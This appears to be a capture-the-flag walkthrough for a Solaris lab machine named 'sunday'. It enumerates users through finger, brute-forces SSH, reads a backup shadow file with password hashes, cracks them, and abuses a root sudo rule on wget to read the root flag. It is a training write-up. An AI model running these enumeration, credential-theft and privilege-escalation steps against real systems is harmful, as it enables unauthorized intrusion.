10.10.10.76

# nmap shows port 79 is open
# And let's also find additional open ports
root@kali > nmap -p- 10.10.10.76 --max-repries 0
# We found additional ports, let's run targeted scan against those:
root@kali > nmap -sV -sC  -p 79,111,22022,34579,51166 10.10.10.76
    PORT      STATE SERVICE VERSION
    79/tcp    open  finger  Sun Solaris fingerd
    |_finger: No one logged on\x0D
    111/tcp   open  rpcbind 2-4 (RPC #100000)
    22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
    | ssh-hostkey:
    |   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
    |_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
    34579/tcp open  unknown
    51166/tcp open  unknown

# let's bruteforce users
root@kali > ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76

    ######## Scan started at Sun Jun 30 05:32:50 2019 #########
    access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..             
    admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp    
      Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                   
         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..          
    anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..       
    bin@10.10.10.76: bin             ???                         < .  .  .  . >..                                                                          
    dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..          
    jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..           
    la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..         
    message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..    
    miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..        
    sammy@10.10.10.76: sammy                 pts/2        <Apr 24, 2018> 10.10.14.4          ..                                                            
    sunny@10.10.10.76: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
    sys@10.10.10.76: sys             ???                         < .  .  .  . >..
    zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
    ######## Scan completed at Sun Jun 30 06:04:07 2019 #########
    13 results.

# sammy and sunny look active because we see the records of connections on Apr 24, 2018 from 10.10.14.4
# Let's check root user
root@kali:/opt/finger-user-enum# finger root@10.10.10.76
    Login       Name               TTY         Idle    When    Where
    root     Super-User            pts/3        <Apr 24, 2018> sunday

# It tells us the machine name: sunday

# We can bruteforce ssh and find the password for sunny : sunday

# Let's collect the data
sunny@sunday : sudo -l
    User sunny may run the following commands on this host:
        (root) NOPASSWD: /root/troll
sunny@sunday: sudo /root/troll
    testing
    uid=0(root) gid=0(root)
# troll command doesn't seem to be interesting

# Let's check interesting folders on / directory
sunny@sunday: ls /
    backup  boot   dev      etc     home    lib         media  net  platform  root   sbin    tmp  var
    bin     cdrom  devices  export  kernel  lost+found  mnt    opt  proc      rpool  system  usr

# Backup looks unusual
sunny@sunday:~$ cd /backup/
sunny@sunday:/backup$ ls
    agent22.backup  shadow.backup
sunny@sunday:/backup$ cat shadow.backup
    mysql:NP:::::::
    openldap:*LK*:::::::
    webservd:*LK*:::::::
    postgres:NP:::::::
    svctag:*LK*:6445::::::
    nobody:*LK*:6445::::::
    noaccess:*LK*:6445::::::
    nobody4:*LK*:6445::::::
    sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
    sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::

# We can bruteforse the hasesh and find a password for sammy : cooldude!

sammy@sunday:~$ sudo -l
    User sammy may run the following commands on this host:
        (root) NOPASSWD: /usr/bin/wget

# We can run wget as root and read the flag
sammy@sunday:~$ sudo /usr/bin/wget -i "/root/root.txt"
    /root/root.txt: Invalid URL fb40fab61d99d37536daeec0d97af9b8: Unsupported scheme
    No URLs found in /root/root.txt.
